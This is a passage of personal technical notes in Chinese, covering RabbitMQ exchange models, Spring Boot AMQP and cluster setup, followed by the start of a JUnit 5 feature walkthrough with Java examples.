//手动确认\n    //参数1：指明确定的是队列中的哪个具体消息\n    //参数2：是否开启多个消息同时确认\n    channel.basicAck(envelope.getDeliveryTag(),false);\n  }\n});\n```\n\n- 设置通道一次只能消费一个消息\n- 关闭消息的自动确认,开启手动确认消息\n\n\n## 第三种模型(fanout) \n`fanout 扇出 也称为广播`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123547.png)\n\n在广播模式下，消息发送流程是这样的：\n-  可以有多个消费者\n-  每个**消费者有自己的queue**（队列）\n-  每个**队列都要绑定到Exchange**（交换机）\n- **生产者发送的消息，只能发送到交换机**，交换机来决定要发给哪个队列，生产者无法决定。\n-  交换机把消息发送给绑定过的所有队列\n-  队列的消费者都能拿到消息。实现一条消息被多个消费者消费\n\n### 开发生产者\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\n//给通道声明指定的交换机\n//参数1：交换机的名字\n//参数2：交换机类型\nchannel.exchangeDeclare(\"logs\",\"fanout\");\n\n//发布消息\nchannel.basicPublish(\"logs\",\"\",null,\"hello\".getBytes());\n```\n\n### 开发消费者-1\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\n//给通道指定交换机\nchannel.exchangeDeclare(\"logs\",\"fanout\");\n\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n\n//将临时队列绑定exchange\nchannel.queueBind(queue,\"logs\",\"\");\n\n//处理消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者1: \"+new String(body));\n  }\n});\n```\n### 开发消费者-2\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\n//给通道指定交换机\nchannel.exchangeDeclare(\"logs\",\"fanout\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//将临时队列绑定exchange\nchannel.queueBind(queue,\"logs\",\"\");\n//处理消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者2: \"+new String(body));\n  }\n});\n```\n### 开发消费者-3\n```java\n//创建连接工厂\nConnectionFactory connectionFactory = new ConnectionFactory();\nconnectionFactory.setHost(\"127.0.0.1\");\nconnectionFactory.setPort(5672);\nconnectionFactory.setVirtualHost(\"/ems\");\nconnectionFactory.setUsername(\"ems\");\nconnectionFactory.setPassword(\"ems\");\n\n//创建连接对象\nConnection connection = connectionFactory.newConnection();\n\n//创建连接中的通道\nChannel channel = connection.createChannel();\n\n//给通道指定交换机\nchannel.exchangeDeclare(\"logs\",\"fanout\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//将临时队列绑定exchange\nchannel.queueBind(queue,\"logs\",\"\");\n//处理消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者3: \"+new String(body));\n  }\n});\n```\n### 测试结果\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123557.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123607.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123616.png)\n\n## Routing之订阅模型-Direct(直连)\n`在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。`\n\n在Direct模型下：\n- 队列与交换机的绑定，不能是任意绑定了，而是要指定一个`RoutingKey`（路由key）\n- 消息的发送方在 向 Exchange发送消息时，也必须指定消息的 `RoutingKey`。\n- Exchange不再把消息交给每一个绑定的队列，而是根据消息的`Routing Key`进行判断，只有队列的`Routingkey`与消息的 `Routing key`完全一致，才会接收到消息\n\n流程:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123627.png)\n\n图解：\n- P：生产者，向Exchange发送消息，发送消息时，会指定一个routing key。\n- X：Exchange（交换机），接收生产者的消息，然后把消息递交给 与routing key完全匹配的队列\n- C1：消费者，其所在队列指定了需要routing key 为 error 的消息\n- C2：消费者，其所在队列指定了需要routing key 为 info、error、warning 的消息\n\n### 开发生产者\n```java\n//声明交换机  参数1:交换机名称 参数2:交换机类型 基于指令的Routing key转发\nchannel.exchangeDeclare(\"logs_direct\",\"direct\");\nString route_key1 = \"error\";\n//发布消息\nchannel.basicPublish(\"logs_direct\",route_key1,null,(\"指定的route key\"+key+\"的消息\").getBytes());\nString route_key2 = \"info\";\nchannel.basicPublish(\"logs_direct\",route_key2,null,(\"指定的route key\"+key+\"的消息\").getBytes());\n```\n### 开发消费者-1\n```java\n //声明交换机\nchannel.exchangeDeclare(\"logs_direct\",\"direct\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//绑定队列和交换机\nchannel.queueBind(queue,\"logs_direct\",\"error\");\nchannel.queueBind(queue,\"logs_direct\",\"info\");\nchannel.queueBind(queue,\"logs_direct\",\"warn\");\n\n//消费消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者1: \"+new String(body));\n  }\n});\n```\n\n### 开发消费者-2\n```java\n//声明交换机\nchannel.exchangeDeclare(\"logs_direct\",\"direct\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//绑定队列和交换机\nchannel.queueBind(queue,\"logs_direct\",\"error\");\n//消费消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者2: \"+new String(body));\n  }\n});\n```\n\n### 测试\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123636.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123645.png)\n\n## Routing 之订阅模型-Topic\n`Topic`类型的`Exchange`与`Direct`相比，都是可以根据`RoutingKey`把消息路由到不同的队列。只不过`Topic`类型`Exchange`可以让队列在绑定`Routing key` 的时候使用通配符！这种模型`Routingkey` 一般都是由一个或多个单词组成，多个单词之间以”.”分割，例如： `item.insert`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123657.png)\n\n**统配符**\n- `*`  匹配不多不少恰好1个词\n- `#`  匹配一个或多个词\n如:\naudit.#    匹配audit.irs.corporate或者 audit.irs 等\naudit.*   只能匹配 audit.irs\n\n### 开发生产者\n```java\n//生命交换机和交换机类型 topic 使用动态路由(通配符方式)\nchannel.exchangeDeclare(\"topics\",\"topic\");\nString routekey = \"user.save\";//动态路由key\n//发布消息\nchannel.basicPublish(\"topics\",routekey,null,(\"这是路由中的动态订阅模型,route key: [\"+routekey+\"]\").getBytes());\n```\n\n### 开发消费者-1 \n`Routing Key中使用*通配符方式`\n\n```java\n //声明交换机\nchannel.exchangeDeclare(\"topics\",\"topic\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//绑定队列与交换机并设置获取交换机中动态路由\nchannel.queueBind(queue,\"topics\",\"user.*\");\n\n//消费消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者1: \"+new String(body));\n  }\n});\n```\n\n### 开发消费者-2\n`Routing Key中使用#通配符方式`\n\n```java\n//声明交换机\nchannel.exchangeDeclare(\"topics\",\"topic\");\n//创建临时队列\nString queue = channel.queueDeclare().getQueue();\n//绑定队列与交换机并设置获取交换机中动态路由\nchannel.queueBind(queue,\"topics\",\"user.#\");\n\n//消费消息\nchannel.basicConsume(queue,true,new DefaultConsumer(channel){\n  @Override\n  public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n    System.out.println(\"消费者2: \"+new String(body));\n  }\n});\n```\n\n# SpringBoot中使用RabbitMQ\n引入依赖\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n```\n配置配置文件\n```yml\nspring:\n  rabbitmq:\n    host: 10.15.0.9\n    port: 5672\n    username: ems\n    password: 123\n    virtual-host: /ems\n```\n\n\n## 第一种hello world模型使用\n### 开发生产者\n```java\n//`RabbitTemplate`类用来简化操作，使用时候直接在项目中注入即可使用\n@Autowired\nprivate RabbitTemplate rabbitTemplate;\n\n@Test\npublic void testHello(){\n  rabbitTemplate.convertAndSend(\"hello\",\"hello world\");\n}\n```\n\n### 开发消费者\n```java\n@Component\n@RabbitListener(queuesToDeclare = @Queue(\"hello\")) //该注解代表该类是消费者，用来监听hello消息队列，如果没有hello消息队列，则会自动创建hello消息队列\npublic class HelloCustomer {\n\n    @RabbitHandler // 该注解表明该消费者得到数据后调用该方法\n    public void receive1(String message){\n        System.out.println(\"message = \" + message);\n    }\n}\n```\n\n**注：**\n@RabbitListener(queues = \"hello\") //该方式也可以用来监听hello消息队列，但是前提是必须要先有hello消息队列，否则会报错\n我们可以使用如下代码来手动创建hello消息队列\n```java\n//注入rabbitmq消息队列，注：该Queue类为org.springframework.amqp.core.Queue;\n@Bean\npublic Queue queue(){\n\treturn new Queue(\"hello\");\n}\n```\n\n\n## 第二种work模型使用\n### 开发生产者\n```java\n@Autowired\nprivate RabbitTemplate rabbitTemplate;\n\n@Test\npublic void testWork(){\n  for (int i = 0; i < 10; i++) {\n    rabbitTemplate.convertAndSend(\"work\",\"hello work!\");\n  }\n}\n```\n### 开发消费者\n```java\n@Component\npublic class WorkCustomer {\n\n    //一个消费者\n    @RabbitListener(queuesToDeclare = @Queue(\"work\"))\n    public void receive1(String message){\n        System.out.println(\"work message1 = \" + message);\n    }\n\n    //另一个消费者\n    @RabbitListener(queuesToDeclare = @Queue(\"work\"))\n    public void receive2(String message){\n        System.out.println(\"work message2 = \" + message);\n    }\n\n}\n```\n\n> `说明:默认在Spring AMQP实现中Work这种方式就是公平调度,如果需要实现能者多劳需要额外配置`\n\n## Fanout广播模型\n### 开发生产者\n```java\n@Autowired\nprivate RabbitTemplate rabbitTemplate;\n\n@Test\npublic void testFanout() throws InterruptedException {\n  rabbitTemplate.convertAndSend(\"logs\",\"\",\"这是日志广播\");\n}\n```\n### 开发消费者\n```java\n@Component\npublic class FanoutCustomer {\n\n    @RabbitListener(bindings = @QueueBinding(\n            value = @Queue,//创建临时队列\n            exchange = @Exchange(name=\"logs\",type = \"fanout\")//创建交换机\n    ))\n    public void receive1(String message){\n        System.out.println(\"message1 = \" + message);\n    }\n\n    @RabbitListener(bindings = @QueueBinding(\n            value = @Queue, //创建临时队列\n            exchange = @Exchange(name=\"logs\",type = \"fanout\")  //创建交换机\n    ))\n    public void receive2(String message){\n        System.out.println(\"message2 = \" + message);\n    }\n}\n```\n## Route路由模型\n### 开发生产者\n```java\n@Autowired\nprivate RabbitTemplate rabbitTemplate;\n\n@Test\npublic void testDirect(){\n  rabbitTemplate.convertAndSend(\"directs\",\"error\",\"error 的日志信息\");\n}\n```\n### 开发消费者\n```java\n@Component\npublic class DirectCustomer {\n\n    @RabbitListener(bindings ={\n            @QueueBinding(\n                    value = @Queue(),\n                    key={\"info\",\"error\"},\n                    exchange = @Exchange(type = \"direct\",name=\"directs\")\n            )})\n    public void receive1(String message){\n        System.out.println(\"message1 = \" + message);\n    }\n\n    @RabbitListener(bindings ={\n            @QueueBinding(\n                    value = @Queue(),\n                    key={\"error\"},\n                    exchange = @Exchange(type = \"direct\",name=\"directs\")\n            )})\n    public void receive2(String message){\n        System.out.println(\"message2 = \" + message);\n    }\n}\n```\n## Topic 订阅模型(动态路由模型)\n### 开发生产者\n```java\n@Autowired\nprivate RabbitTemplate rabbitTemplate;\n\n//topic\n@Test\npublic void testTopic(){\n  rabbitTemplate.convertAndSend(\"topics\",\"user.save.findAll\",\"user.save.findAll 的消息\");\n}\n```\n### 开发消费者\n```java\n@Component\npublic class TopCustomer {\n    @RabbitListener(bindings = {\n            @QueueBinding(\n                    value = @Queue,\n                    key = {\"user.*\"},\n                    exchange = @Exchange(type = \"topic\",name = \"topics\")\n            )\n    })\n    public void receive1(String message){\n        System.out.println(\"message1 = \" + message);\n    }\n\n    @RabbitListener(bindings = {\n            @QueueBinding(\n                    value = @Queue,\n                    key = {\"user.#\"},\n                    exchange = @Exchange(type = \"topic\",name = \"topics\")\n            )\n    })\n    public void receive2(String message){\n        System.out.println(\"message2 = \" + message);\n    }\n}\n```\n\n# MQ的应用场景\n## 异步处理\n`场景说明：用户注册后，需要发注册邮件和注册短信,传统的做法有两种 1.串行的方式 2.并行的方式`\n- `串行方式:` 将注册信息写入数据库后,发送注册邮件,再发送注册短信,以上三个任务全部完成后才返回给客户端。 这有一个问题是,邮件,短信并不是必须的,它只是一个通知,而这种做法让客户端等待没有必要等待的东西. \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123732.png)\n\n- `并行方式: `将注册信息写入数据库后,发送邮件的同时,发送短信,以上三个任务完成后,返回给客户端,并行的方式能提高处理的时间。 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123740.png)\n\n- `消息队列:`假设三个业务节点分别使用50ms,串行方式使用时间150ms,并行使用时间100ms。虽然并行已经提高的处理时间,但是,前面说过,邮件和短信对我正常的使用网站没有任何影响，客户端没有必要等着其发送完成才显示注册成功,应该是写入数据库后就返回.  `消息队列`: 引入消息队列后，把发送邮件,短信不是必须的业务逻辑异步处理 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123748.png)\n\n由此可以看出,引入消息队列后，用户的响应时间就等于写入数据库的时间+写入消息队列的时间(可以忽略不计),引入消息队列后处理后,响应时间是串行的3倍,是并行的2倍。\n\n##  应用解耦\n`场景：双11是购物狂节,用户下单后,订单系统需要通知库存系统,传统的做法就是订单系统调用库存系统的接口. `\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123759.png)\n\n这种做法有一个缺点:\n当库存系统出现故障时,订单就会失败。 订单系统和库存系统高耦合.  引入消息队列 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123808.png)\n\n- `订单系统:`用户下单后,订单系统完成持久化处理,将消息写入消息队列,返回用户订单下单成功。\n- `库存系统:`订阅下单的消息,获取下单消息,进行库操作。  就算库存系统出现故障,消息队列也能保证消息的可靠投递,不会导致消息丢失.\n\n## 流量削峰\n`场景:` 秒杀活动，一般会因为流量过大，导致应用挂掉,为了解决这个问题，一般在应用前端加入消息队列。  \n`作用:` \n- 可以控制活动人数，超过此一定阀值的订单直接丢弃\n- 可以缓解短时间的高流量压垮应用(应用程序按自己的最大处理能力获取订单) \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123820.png)\n\n1. 用户的请求,服务器收到之后,首先写入消息队列,加入消息队列长度超过最大值,则直接抛弃用户请求或跳转到错误页面.  \n2. 秒杀业务根据消息队列中的请求信息，再做后续处理.\n\n\n# RabbitMQ的集群\n## 普通集群(副本集群)\n默认情况下:RabbitMQ代理操作所需的所有数据/状态都将跨所有节点复制。这方面的一个例外是消息队列，默认情况下，消息队列位于一个节点上，尽管它们可以从所有节点看到和访问\n\n架构图:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123829.png)\n\n核心解决问题: 当集群中某一时刻master节点宕机,可以对Quene中信息,进行备份\n\n### 集群搭建\n0. 集群规划\nnode1: 10.15.0.3  mq1  master 主节点\nnode2: 10.15.0.4  mq2  repl1  副本节点\nnode3: 10.15.0.5  mq3  repl2  副本节点\n\n1. 克隆三台机器主机名和ip映射\nvim /etc/hosts加入:\n    10.15.0.3 mq1\n    10.15.0.4 mq2\n    10.15.0.5 mq3\nnode1: vim /etc/hostname 加入:  mq1\nnode2: vim /etc/hostname 加入:  mq2\nnode3: vim /etc/hostname 加入:  mq3\n\n2. 三个机器安装rabbitmq,并同步cookie文件,在node1上执行:\nscp /var/lib/rabbitmq/.erlang.cookie root@mq2:/var/lib/rabbitmq/\nscp /var/lib/rabbitmq/.erlang.cookie root@mq3:/var/lib/rabbitmq/\n\n3. 查看cookie是否一致:\nnode1: cat /var/lib/rabbitmq/.erlang.cookie \nnode2: cat /var/lib/rabbitmq/.erlang.cookie \nnode3: cat /var/lib/rabbitmq/.erlang.cookie \n\n4. 后台启动rabbitmq所有节点执行如下命令:\nrabbitmq-server -detached \n\n5. 在node2和node3执行加入集群命令:\n1.关闭       rabbitmqctl stop_app\n2.加入集群    rabbitmqctl join_cluster rabbit@mq1\n3.启动服务    rabbitmqctl start_app\n\n6. 执行下面命令，查看集群状态,任意节点执行:\nrabbitmqctl cluster_status\n\n7. 如果出现如下显示,集群搭建成功:\n```\nCluster status of node rabbit@mq3 ...\n[{nodes,[{disc,[rabbit@mq1,rabbit@mq2,rabbit@mq3]}]},\n{running_nodes,[rabbit@mq1,rabbit@mq2,rabbit@mq3]},\n{cluster_name,<<\"rabbit@mq1\">>},\n{partitions,[]},\n{alarms,[{rabbit@mq1,[]},{rabbit@mq2,[]},{rabbit@mq3,[]}]}]\n```\n\n8. 登录管理界面,展示如下状态:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123721.png)\n\n# 9.测试集群在node1上,创建队列\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123711.png)\n\n# 10.查看node2和node3节点:\n```\n\n![image-20200320095827688](RibbitMQ 实战教程.assets/image-20200320095827688.png)\n\n![image-20200320095843370](RibbitMQ 实战教程.assets/image-20200320095843370.png)\n\n```markdown\n   # 11.关闭node1节点,执行如下命令,查看node2和node3:\n   \trabbitmqctl stop_app\n   ```\n\n   ![image-20200320100000347](RibbitMQ 实战教程.assets/image-20200320100000347.png)\n\n   ![image-20200320100010968](RibbitMQ 实战教程.assets/image-20200320100010968.png)\n\n   ---\n\n#### 7.1.2 镜像集群\n\n> This guide covers mirroring (queue contents replication) of classic queues  --摘自官网\n>\n> By default, contents of a queue within a RabbitMQ cluster are located on a single node (the node on which the queue was declared). This is in contrast to exchanges and bindings, which can always be considered to be on all nodes. Queues can optionally be made *mirrored* across multiple nodes. --摘自官网\n\n`镜像队列机制就是将队列在三个节点之间设置主从关系，消息会在三个节点之间进行自动同步，且如果其中一个节点不可用，并不会导致消息丢失或服务不可用的情况，提升MQ集群的整体高可用性。`\n\n\n\n1. ##### 集群架构图\n\n   ![image-20200320113423235](RibbitMQ 实战教程.assets/image-20200320113423235.png)\n\n   \n\n2. ##### 配置集群架构\n\n   ```markdown\n   # 0.策略说明\n   \trabbitmqctl set_policy [-p <vhost>] [--priority <priority>] [--apply-to <apply-to>] <name> <pattern>  <definition>\n   \t-p Vhost： 可选参数，针对指定vhost下的queue进行设置\n   \tName:     policy的名称\n   \tPattern: queue的匹配模式(正则表达式)\n   \tDefinition：镜像定义，包括三个部分ha-mode, ha-params, ha-sync-mode\n              \t\tha-mode:指明镜像队列的模式，有效值为 all/exactly/nodes\n                           all：表示在集群中所有的节点上进行镜像\n                           exactly：表示在指定个数的节点上进行镜像，节点的个数由ha-params指定\n                           nodes：表示在指定的节点上进行镜像，节点名称通过ha-params指定\n               \t ha-params：ha-mode模式需要用到的参数\n                   ha-sync-mode：进行队列中消息的同步方式，有效值为automatic和manual\n                   priority：可选参数，policy的优先级\n                   \n                    \n   # 1.查看当前策略\n   \trabbitmqctl list_policies\n   \n   # 2.添加策略\n   \trabbitmqctl set_policy ha-all '^hello' '{\"ha-mode\":\"all\",\"ha-sync-mode\":\"automatic\"}' \n   \t说明:策略正则表达式为 “^” 表示所有匹配所有队列名称  ^hello:匹配hello开头队列\n   \n   # 3.删除策略\n   \trabbitmqctl clear_policy ha-all\n   \n   # 4.测试集群\n   ```\n\n   ----\n\n   \n"
  },
  {
    "title": "./notes/back-end/junit5.md",
    "body": "# Display Names\n测试类和测试方法可以通过@DisplayName — 带有空格、特殊字符甚至表情符号 — 来声明自定义显示名称，这些名称将显示在测试报告中以及测试运行程序和IDE中。\n```java\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\n@DisplayName(\"A special test case\")\nclass DisplayNameDemo {\n\n    @Test\n    @DisplayName(\"Custom test name containing spaces\")\n    void testWithDisplayNameContainingSpaces() {\n    }\n\n    @Test\n    @DisplayName(\"╯°□°）╯\")\n    void testWithDisplayNameContainingSpecialCharacters() {\n    }\n\n    @Test\n    @DisplayName(\"😱\")\n    void testWithDisplayNameContainingEmoji() {\n    }\n}\n```\n\n# Assertions\nJUnit Jupiter comes with many of the assertion methods that JUnit 4 has and adds a few that lend themselves well to being used with Java 8 lambdas. All JUnit Jupiter assertions are static methods in the org.junit.jupiter.api.Assertions class.\n```java\nimport static java.time.Duration.ofMillis;\nimport static java.time.Duration.ofMinutes;\nimport static org.junit.jupiter.api.Assertions.assertAll;\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertNotNull;\nimport static org.junit.jupiter.api.Assertions.assertThrows;\nimport static org.junit.jupiter.api.Assertions.assertTimeout;\nimport static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;\nimport static org.junit.jupiter.api.Assertions.assertTrue;\n\nimport java.util.concurrent.CountDownLatch;\n\nimport example.domain.Person;\nimport example.util.Calculator;\n\nimport org.junit.jupiter.api.Test;\n\nclass AssertionsDemo {\n\n    private final Calculator calculator = new Calculator();\n\n    private final Person person = new Person(\"Jane\", \"Doe\");\n\n    @Test\n    void standardAssertions() {\n        assertEquals(2, calculator.add(1, 1));\n        assertEquals(4, calculator.multiply(2, 2),\n                \"The optional failure message is now the last parameter\");\n        assertTrue('a' < 'b', () -> \"Assertion messages can be lazily evaluated -- \"\n                + \"to avoid constructing complex messages unnecessarily.\");\n    }\n\n    @Test\n    void groupedAssertions() {\n        // In a grouped assertion all assertions are executed, and all\n        // failures will be reported together.\n        assertAll(\"person\",\n            () -> assertEquals(\"Jane\", person.getFirstName()),\n            () -> assertEquals(\"Doe\", person.getLastName())\n        );\n    }\n\n    @Test\n    void dependentAssertions() {\n        // Within a code block, if an assertion fails the\n        // subsequent code in the same block will be skipped.\n        assertAll(\"properties\",\n            () -> {\n                String firstName = person.getFirstName();\n                assertNotNull(firstName);\n\n                // Executed only if the previous assertion is valid.\n                assertAll(\"first name\",\n                    () -> assertTrue(firstName.startsWith(\"J\")),\n                    () -> assertTrue(firstName.endsWith(\"e\"))\n                );\n            },\n            () -> {\n                // Grouped assertion, so processed independently\n                // of results of first name assertions.\n                String lastName = person.getLastName();\n                assertNotNull(lastName);\n\n                // Executed only if the previous assertion is valid.\n                assertAll(\"last name\",\n                    () -> assertTrue(lastName.startsWith(\"D\")),\n                    () -> assertTrue(lastName.endsWith(\"e\"))\n                );\n            }\n        );\n    }\n\n    @Test\n    void exceptionTesting() {\n        Exception exception = assertThrows(ArithmeticException.class, () ->\n            calculator.divide(1, 0));\n        assertEquals(\"/ by zero\", exception.getMessage());\n    }\n\n    @Test\n    void timeoutNotExceeded() {\n        // The following assertion succeeds.\n        assertTimeout(ofMinutes(2), () -> {\n            // Perform task that takes less than 2 minutes.\n        });\n    }\n\n    @Test\n    void timeoutNotExceededWithResult() {\n        // The following assertion succeeds, and returns the supplied object.\n        String actualResult = assertTimeout(ofMinutes(2), () -> {\n            return \"a result\";\n        });\n        assertEquals(\"a result\", actualResult);\n    }\n\n    @Test\n    void timeoutNotExceededWithMethod() {\n        // The following assertion invokes a method reference and returns an object.\n        String actualGreeting = assertTimeout(ofMinutes(2), AssertionsDemo::greeting);\n        assertEquals(\"Hello, World!\", actualGreeting);\n    }\n\n    @Test\n    void timeoutExceeded() {\n        // The following assertion fails with an error message similar to:\n        // execution exceeded timeout of 10 ms by 91 ms\n        assertTimeout(ofMillis(10), () -> {\n            // Simulate task that takes more than 10 ms.\n            Thread.sleep(100);\n        });\n    }\n\n    @Test\n    void timeoutExceededWithPreemptiveTermination() {\n        // The following assertion fails with an error message similar to:\n        // execution timed out after 10 ms\n        assertTimeoutPreemptively(ofMillis(10), () -> {\n            // Simulate task that takes more than 10 ms.\n            new CountDownLatch(1).await();\n        });\n    }\n\n    private static String greeting() {\n        return \"Hello, World!\";\n    }\n\n}\n```\n# TestInfo\n```java\n@DisplayName(\"TestInfo Demo\")\nclass TestInfoDemo {\n\n    TestInfoDemo(TestInfo testInfo) {\n        assertEquals(\"TestInfo Demo\", testInfo.getDisplayName());\n    }\n\n    @BeforeEach\n    void init(TestInfo testInfo) {\n        String displayName = testInfo.getDisplayName();\n        assertTrue(displayName.equals(\"TEST 1\") || displayName.equals(\"test2()\"));\n    }\n\n    @Test\n    @DisplayName(\"TEST 1\")\n    @Tag(\"my-tag\")\n    void test1(TestInfo testInfo) {\n        assertEquals(\"TEST 1\", testInfo.getDisplayName());\n        assertTrue(testInfo.getTags().contains(\"my-tag\"));\n    }\n\n    @Test\n    void test2() {\n    }\n\n}\n```\n# Repeated Tests\n```java\nclass RepeatedTestsDemo {\n\n    private Logger logger = // ...\n\n    @BeforeEach\n    void beforeEach(TestInfo testInfo, RepetitionInfo repetitionInfo) {\n        int currentRepetition = repetitionInfo.getCurrentRepetition();\n        int totalRepetitions = repetitionInfo.getTotalRepetitions();\n        String methodName = testInfo.getTestMethod().get().getName();\n        logger.info(String.format(\"About to execute repetition %d of %d for %s\", //\n            currentRepetition, totalRepetitions, methodName));\n    }\n\n    @RepeatedTest(10)\n    void repeatedTest() {\n        // ...\n    }\n\n    @RepeatedTest(5)\n    void repeatedTestWithRepetitionInfo(RepetitionInfo repetitionInfo) {\n        assertEquals(5, repetitionInfo.getTotalRepetitions());\n    }\n\n    @RepeatedTest(value = 1, name = \"{displayName} {currentRepetition}/{totalRepetitions}\")\n    @DisplayName(\"Repeat!\")\n    void customDisplayName(TestInfo testInfo) {\n        assertEquals(\"Repeat! 1/1\", testInfo.getDisplayName());\n    }\n\n    @RepeatedTest(value = 1, name = RepeatedTest.LONG_DISPLAY_NAME)\n    @DisplayName(\"Details...\")\n    void customDisplayNameWithLongPattern(TestInfo testInfo) {\n        assertEquals(\"Details... :: repetition 1 of 1\", testInfo.getDisplayName());\n    }\n\n    @RepeatedTest(value = 5, name = \"Wiederholung {currentRepetition} von {totalRepetitions}\")\n    void repeatedTestInGerman() {\n        // ...\n    }\n\n}\n```\n输出：\n```\n├─ RepeatedTestsDemo ✔\n│  ├─ repeatedTest() ✔\n│  │  ├─ repetition 1 of 10 ✔\n│  │  ├─ repetition 2 of 10 ✔\n│  │  ├─ repetition 3 of 10 ✔\n│  │  ├─ repetition 4 of 10 ✔\n│  │  ├─ repetition 5 of 10 ✔\n│  │  ├─ repetition 6 of 10 ✔\n│  │  ├─ repetition 7 of 10 ✔\n│  │  ├─ repetition 8 of 10 ✔\n│  │  ├─ repetition 9 of 10 ✔\n│  │  └─ repetition 10 of 10 ✔\n│  ├─ repeatedTestWithRepetitionInfo(RepetitionInfo) ✔\n│  │  ├─ repetition 1 of 5 ✔\n│  │  ├─ repetition 2 of 5 ✔\n│  │  ├─ repetition 3 of 5 ✔\n│  │  ├─ repetition 4 of 5 ✔\n│  │  └─ repetition 5 of 5 ✔\n│  ├─ Repeat! ✔\n│  │  └─ Repeat! 1/1 ✔\n│  ├─ Details... ✔\n│  │  └─ Details... :: repetition 1 of 1 ✔\n│  └─ repeatedTestInGerman() ✔\n│     ├─ Wiederholung 1 von 5 ✔\n│     ├─ Wiederholung 2 von 5 ✔\n│     ├─ Wiederholung 3 von 5 ✔\n│     ├─ Wiederholung 4 von 5 ✔\n│     └─ Wiederholung 5 von 5 ✔\n```\n# Timeouts\n```java\nclass TimeoutDemo {\n\n    @BeforeEach\n    @Timeout(5)\n    void setUp() {\n        // fails if execution time exceeds 5 seconds\n    }\n\n    @Test\n    @Timeout(value = 100, unit = TimeUnit.MILLISECONDS)\n    void failsIfExecutionTimeExceeds100Milliseconds() {\n        // fails if execution time exceeds 100 milliseconds\n    }\n\n}\n```\n# Test Execution Order\n## Method Order\n```java\n@TestMethodOrder(OrderAnnotation.class)\nclass OrderedTestsDemo {\n\n    @Test\n    @Order(1)\n    void nullValues() {\n        // perform assertions against null values\n    }\n\n    @Test\n    @Order(2)\n    void emptyValues() {\n        // perform assertions against empty values\n    }\n\n    @Test\n    @Order(3)\n    void validValues() {\n        // perform assertions against valid values\n    }\n\n}\n```\n## Class Order\n```java\n@TestClassOrder(ClassOrderer.OrderAnnotation.class)\nclass OrderedNestedTestClassesDemo {\n\n    @Nested\n    @Order(1)\n    class 